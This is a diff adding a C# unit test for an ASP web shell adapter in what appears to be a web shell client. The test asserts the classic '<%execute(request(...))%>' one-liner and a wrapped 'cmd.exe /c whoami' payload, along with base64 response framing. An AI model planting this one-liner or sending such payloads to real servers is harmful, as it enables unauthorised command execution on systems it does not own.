@@ -133,6 +133,32 @@ public class WebShellTests
     }
 
     [Fact]
+    public void EvalAspAdapter_RendersTheExecuteOneLiner_AndRoundTripsTheFramedAnswer()
+    {
+        var adapter = new EvalAspAdapter();
+
+        var script = adapter.RenderScript("connect");
+        Assert.Equal("<%execute(request(\"connect\"))%>", script);
+        Assert.Equal("connect", adapter.ReadCredentialFromScript(script));
+
+        // The wrapper rides the connection parameter itself (the execute
+        // consumes the value directly), the command VBScript-escaped inside
+        // the platform shell's exec; the answer frames with the family's
+        // markers around the MSXML base64.
+        var request = adapter.EncodeCommand(
+            "http://web.example.test/up.asp", "connect", "base64", "base64", "whoami \"x\"");
+        var parameter = Assert.Single(request.Form);
+        Assert.Equal("connect", parameter.Key);
+        Assert.Contains("cmd.exe /c whoami \"\"x\"\"\"", parameter.Value);
+        Assert.Contains("MSXML2.DOMDocument", parameter.Value);
+        Assert.DoesNotContain(request.TagStart, parameter.Value);
+
+        var framed = request.TagStart + Convert.ToBase64String("uid=0(root)"u8) + request.TagEnd;
+        Assert.Equal("uid=0(root)", adapter.DecodeResponse(request, "base64", framed));
+        Assert.Null(adapter.DecodeResponse(request, "base64", "just a plain page"));
+    }
+
+    [Fact]
     public void Adapter_RendersTheEvalOneLiner()
     {
         var adapter = new EvalPhpAdapter();
